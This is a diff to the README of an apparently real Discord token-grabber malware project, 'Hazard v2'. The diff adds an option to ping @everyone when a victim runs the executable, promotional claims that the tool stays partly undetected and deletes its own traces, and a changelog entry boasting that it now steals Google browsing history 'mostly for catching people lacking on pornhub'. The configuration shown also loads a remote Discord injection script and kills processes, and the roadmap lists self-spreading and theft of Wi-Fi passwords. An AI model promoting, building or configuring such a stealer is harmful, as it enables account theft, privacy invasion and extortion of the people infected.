@@ -86,6 +86,8 @@ config = {
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
+    # if True, it will ping @everyone when someone ran Hazard v2
+    'ping_on_run': False,
     # set to False if you don't want it to kill programs such as discord upon running the exe
     'kill_processes': True,
     # if you want the file to run at startup
@@ -115,7 +117,8 @@ Here are some pros and cons why/why not use Hazard v2 instead of other ones
 
 ⁃ Extremely well maintained, making it a safe choice \
 ⁃ Partly undetected just because it gets updates often \
-⁃ Free and easy to use/setup \
+⁃ Easy to use and setup \
+⁃ Completely free and open source \
 ⁃ Loads of wide spread features not only focused on discord \
 ⁃ Cleans itself up, deleting all traces of itself which suprisingly most others don't \
 ⁃ Supports a webhook protector I made ([Discord-Webhook-Protector](https://github.com/Rdimo/Discord-Webhook-Protector)) making it impossible to delete your webhook \
@@ -126,7 +129,8 @@ Here are some pros and cons why/why not use Hazard v2 instead of other ones
 ### ❌ Cons
 
 ⁃ Made in Python making it lose to other grabbers in terms of speed \
-⁃ Python is an interpreted language, it needs to pack the engine & all dependencies in the binary making the file size very big \
+⁃ Python is an interpreted language, it needs to pack the engine & all dependencies making the file size very big \
+⁃ Only supports windows 10/11 \
 ⁃ Can be pretty easily decompiled (still harder than Mercurial atleast)
 
 In the end it's just up to **you** to choose what grabber suits you and your needs the best.
@@ -138,7 +142,6 @@ In the end it's just up to **you** to choose what grabber suits you and your nee
 ~~overlined~~ = on hold/not adding
   
 - Self spread | Suggestion from [FuckingToasters](https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/31)
-- Grab Chrome history | Suggestion from [TeteuXD2](https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/300)
 - Grab Wifi passwords | Suggestion from [msr8](https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/35)
 - ~~Metamask Priv Key and seed | Suggestion from [Snipeeeey](https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/281)~~
 - Grab Minecraft accessToken | Suggestion from [p3tt3](https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/248)
@@ -168,6 +171,11 @@ join [cheataway](https://cheataway.com/invite) and do `!buy` to see preview of t
 ## <a id="changelog"></a>💭 〢 ChangeLog
 
 ```diff
+v1.8.4 ⋮ 2022-06-21
++ now grabs history from google (mostly for catching people lacking on pornhub)
++ added option to ping @everyone when the grabber has been run
++ additional improvements making it slightly faster and more stable
+
 v1.8.3 ⋮ 2022-06-19
 + fixed minor bug were injector would fail to inject (ty akro#0001 for reporting)
 
